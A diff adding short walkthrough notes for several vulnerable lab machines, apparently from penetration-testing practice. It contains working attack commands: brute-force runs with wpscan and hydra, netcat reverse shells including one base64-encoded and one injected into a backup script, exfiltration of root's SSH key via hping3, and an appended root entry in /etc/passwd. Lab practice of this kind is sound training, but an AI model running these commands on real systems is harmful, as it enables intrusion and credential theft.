@@ -1793,3 +1793,184 @@ Ssh login and run linpeas. Found 40847 vulnerable.
 
 Exploit and get root. 
 ```
+
+## Loly
+```
+1. Found only port 80 open and subdirectory /wordpress
+
+2. Found username - loly
+wpscan --enumerate u --url http://loly.lc/wordpress/ 
+
+3. Found password with bruteforce - fernando
+wpscan --password-attack wp-login -U loly  -P /usr/share/wordlists/rockyou.txt --url http://loly.lc/wordpress  
+
+4. Obtaned reverse shell
+a. upload php monkey reverse at adrotate > manage media > upload in zip file 
+b. access it on loly.lc/wordpress/wp-content/shell.php
+
+5. Linpeas gives creds loly:lolyisabeautifulgirl
+
+6. Kernel exploit for PE. 
+4.4.0-31-generic - https://www.exploit-db.com/exploits/45010
+```
+
+## ICMP
+```
+1. Portscan - 22 and 80
+
+2. Found exploit. https://github.com/jayngng/monitorr-v1.7.6m-rce.git
+a. python3 monitorr.py (supply url lhost and lport=80 other are blocked)
+b. nc -lvnp 80
+
+3. Find out encrypted password. Decrypt it. 
+www-data@icmp:/home/fox$ cat devel/crypt.php
+cat devel/crypt.php
+<?php
+echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
+?>
+
+4. Login as fox and checked out sudo priv. 
+fox@icmp:~$ sudo -l
+sudo -l
+[sudo] password for fox: BUHNIJMONIBUVCYTTYVGBUHJNI         
+
+Matching Defaults entries for fox on icmp:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fox may run the following commands on icmp:
+    (root) /usr/sbin/hping3 --icmp *
+    (root) /usr/bin/killall hping3
+
+5. Obtained root using icmp sudo technique
+listener - sudo hping3 --icmp 127.0.0.1 --listen signature --safe
+pining from another terminal - sudo hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa
+
+6. Listener will capture id_rsa and use it for root ssh. 
+ssh -i rootid_rsa root@192.168.196.218
+```
+
+## NoName
+```
+1. Port Scan - 80
+
+2. Found unique sub-directory 'superadmin.php'. 
+gobuster dir -u http://192.168.196.15/ -w /usr/share/dirb/wordlists/big.txt -X .php
+
+3. Check out field php code. 
+127.0.0.1 | cat superadmin.php (check source page)
+
+5. Obtained reverse shell (using nc.traditional)
+ping 127.0.0.1 | `echo "bgBjAC4AdAByAGEAZABpAHQAaQBvAG4AYQBsACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAwACAAMQAyADMANQAgAC0AZQAgAC8AYgBpAG4ALwBiAGEAcwBoAA==" | base64 -d`
+
+6. Use 'find' SUID for privilege escalation. 
+```
+
+## DC-4 
+```
+1. Port scan - 22, 80
+
+2. Bruteforce with burp intruder - figure out creds 'admin:happy'
+
+3. Logged in, intercept running list files with brup, figure out command exec location.
+
+4. Obtained reverse shell. (radio=la+-l|nc 192.168.45.160 1235 -e /bin/bash&submit=Run)
+
+5. Obtained local.txt, there was a wordlist for jim user. 
+
+6. Brute force ssh with hydra and found jim creds. (jim:jibril04)
+
+7. Ssh logged in, figure out there was not with charles creds. /var/mail/jim (charles:^xHhA&hvim0y)
+
+8. Charles have sudo privileges (/usr/bin/teehee). Use it for root
+a. /usr/bin/teehee --help
+b. sudo /usr/bin/teehee -a /etc/passwd
+root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash
+
+9. Rooted with new root user. 
+```
+
+## Funbox
+```
+1. Port scan - 21,22,80,33060
+
+2. Change domain name, search for user with wpscan (joe, admin)
+wpscan --url http://funbox.fritz.box/ --enumerate u 
+
+3. ssh bruteforce with hydra. found creds (joe:12345)
+ hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://funbox.fritz.box
+
+4. Ssh login and found local.txt. Make the shell more interactive. Found backup.sh under funny user. 
+
+4. Add reverse shell command. Obatined shell as funny user. 
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.160 1236 >/tmp/f' >> .backup.sh 
+
+5. PwnKit to root from funny user. Obtained proof.txt
+```
+
+## BTRSys2.1
+```
+1. Port scan : 21,22,80
+
+2. Subdirectory: /wordpress 
+
+3. admin:admin creds, change 404.php with monkey pentest, obntained reverse shell. 
+
+4. Found mysql creds (root:rootpassword!)
+
+5. Get root creds from wp_users table 
+
+6. Rooted (root:roottoor)
+```
+
+## MY-CMSMS
+```
+1. Port scan - 22, 80, 3306, 33060
+
+2. Mysql login (root:root) - mysql -u 'root' -h 192.168.196.74 -p
+
+3. Change password for admin. - update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin';
+
+4. Login /admin. And then get reverse shell using exploit. 
+python3 48779.py --url http://192.168.196.74/admin/login.php -u admin -p admin -lhost 192.168.45.160 -lport 1337
+
+5. Run linpeas. Found armour creds. 
+cat /var/www/html/admin/.htpasswd
+TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
+su armour
+Password: Shield@123%
+
+6. Rooted with - python sudo priv esc. 
+```
+
+## Pwned1
+```
+1. Port scan - 21, 22, 80
+
+2. Found sub-direcotry /pwned.vuln with ftp user creds (ftpuser:B0ss_Pr!ncesS)
+
+3. Ftp login and found idrsa and note. Download it. 
+
+4. Ssh to user ariana and got local.txt
+
+5. Found messenger.sh. Run it, give input (selena, /bin/bash)
+
+6. It runs as user selena. Found docker SUID. 
+
+7. Run Docker SUID priv esc. (use /bin/bash instead of /sh in command). Rooted. 
+```
+
+## Tre
+```
+1. Port scan - 22, 80, 8082
+
+2. Found subdirectory with creds. http://192.168.196.84/mantisbt/config/a.txt
+
+3. Login and found tre pass. http://192.168.196.84/adminer.php?username=mantissuser&db=mantis&select=mantis_user_table
+
+4. Shutdown sudo privileges. Add new line 'chmod +s /usr/bin/bash'. tre@tre:~$ nano /usr/bin/check-system
+
+5. sudo shutdown -r now . Rejoin. 
+
+6. bash -p #rooted 
+```
